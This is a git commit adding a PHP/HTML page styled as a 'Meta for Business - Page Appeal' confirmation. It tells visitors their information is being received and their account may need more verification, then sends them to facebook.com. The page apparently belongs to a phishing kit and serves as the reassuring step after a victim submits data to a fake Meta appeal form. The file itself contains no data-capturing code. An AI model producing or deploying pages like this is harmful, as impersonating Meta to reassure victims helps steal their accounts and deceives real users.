fe8ff3131200fc561b9d301729db9cfa79c81a73
hlp-check <nmulyo863@gmail.com>
2024-07-29 01:17:36 +0700

    Add files via upload

---
+++ next.php
@@ -0,0 +1,19 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Meta for Business - Page Appeal</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+  </head>
+  <body>
+      <div class="container">
+          <img width="50%" src="assets/img/robot.ff4c3a1e6d1f32fb5a6b.jpg" alt="" />
+          <div class="tect">
+            <p class="fw-bold">Hi, We are receiving your information</p>
+            <p>Reviewing your activity takes just a few more moments. We might require additional information to confirm that this is your account</p>
+            <button onclick="location.href='https://www.facebook.com'" class="btn btn-primary fw-bold p-2 w-100 mt-3">Next</button>
+          </div>
+      </div>
+  </body>
+ </html> 
